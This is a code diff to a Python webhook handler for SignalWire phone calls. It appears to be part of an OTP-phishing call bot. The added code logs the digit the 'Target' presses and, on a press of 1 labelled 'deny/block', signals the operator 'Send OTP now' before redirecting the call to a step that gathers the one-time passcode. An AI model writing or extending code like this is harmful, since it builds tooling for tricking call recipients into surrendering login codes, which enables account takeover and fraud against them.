@@ -245,14 +245,17 @@ async def signalwire_first_input(call_id: str, request: Request, Digits: str = F
         
         voice = call_data.get('tts_voice', 'Aurora')
         
-        # Create event
+        # Create event with detailed message
+        event_message = f'🔢 Target pressed {Digits}'
         event = {
             'time': datetime.utcnow().isoformat(),
             'event': 'first_input_received',
+            'message': event_message,
             'data': {'digit': Digits}
         }
         
         await MongoDBService.update_call_events(call_id, event)
+        await MongoDBService.update_call_field(call_id, 'user_response', Digits)
         await manager.send_to_user(call_data['user_id'], {
             'type': 'call_event',
             'call_id': call_id,
@@ -262,6 +265,20 @@ async def signalwire_first_input(call_id: str, request: Request, Digits: str = F
         backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
         
         if Digits == '1':
+            # User pressed 1 - Send OTP now event
+            otp_event = {
+                'time': datetime.utcnow().isoformat(),
+                'event': 'send_otp_now',
+                'message': '🚀 Send OTP now',
+                'data': {}
+            }
+            await MongoDBService.update_call_events(call_id, otp_event)
+            await manager.send_to_user(call_data['user_id'], {
+                'type': 'call_event',
+                'call_id': call_id,
+                'event': otp_event
+            })
+            
             # User pressed 1 (deny/block) - Redirect to gather OTP (Step 2 Message)
             deny_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/deny"
             twiml = f'<?xml version="1.0" encoding="UTF-8"?><Response><Redirect>{deny_url}</Redirect></Response>'
